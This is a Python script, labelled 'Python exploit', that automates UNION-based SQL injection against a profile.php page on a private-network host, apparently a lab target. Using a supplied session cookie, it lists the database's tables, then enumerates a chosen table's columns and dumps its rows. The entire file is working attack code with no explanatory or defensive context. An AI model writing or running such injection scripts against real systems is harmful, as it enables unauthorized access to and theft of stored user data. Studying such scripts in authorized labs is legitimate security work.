from cmath import inf
from operator import contains
import requests
import html
import argparse
import os
import re

def gettable(cookie):
    url = "http://192.168.11.128/profile.php?username=test'+union+select+1,2,group_concat(table_name),4,5,6+from+information_schema.tables+where+table_schema=database()--+-"
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64)','Cookie':'PHPSESSID={}'.format(cookie)}
    res= requests.get(url, headers = headers)
    exploit = res.text[res.text.find('<h1>'):res.text.find('s Profile')-1]
    exploit = html.unescape(exploit[exploit.find(':')+5:])
    print(exploit)
def table(table,cookie):
    url = "http://192.168.11.128/profile.php?username=test'+union+select+1,2,group_concat(column_name),4,5,6+from+information_schema.columns+where+table_name='{}'--+-".format(table)
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64)','Cookie':'PHPSESSID={}'.format(cookie)}
    res= requests.get(url, headers = headers)
    exploit = res.text[res.text.find('<h1>'):res.text.find('s Profile')-1]
    exploit = html.unescape(exploit[exploit.find(':')+5:])
    list = exploit.split(",")
    for j in range(10):
        stt = j
        inf = ''
        for i in range(len(list)):
            data = list[i]
            url = "http://192.168.11.128/profile.php?username=test'+union+select+1,2,{},4,5,6+from+{}+limit+{},1--+-".format(data,table,stt)
            res= requests.get(url, headers = headers)
            if(res.text.find('User not found.Try again')==-1):
                exploit = res.text[res.text.find('<h1>'):res.text.find('s Profile')-1]
                exploit = html.unescape(exploit[exploit.find(':')+5:])
                inf = inf+exploit+'    '
        if(inf!=''): print(inf)
if __name__ == '__main__':
    parser=argparse.ArgumentParser(description='Python exploit')
    parser.add_argument('-g',"--gettable",default=None)
    parser.add_argument('-c',"--cookie",default=None)
    parser.add_argument('-t',"--table",default=None)
    args=parser.parse_args()
    args = parser.parse_args()
    if args.cookie  != None:
        if args.gettable != None:
            gettable(args.cookie)
        elif args.table != None:
            table(args.table,args.cookie)

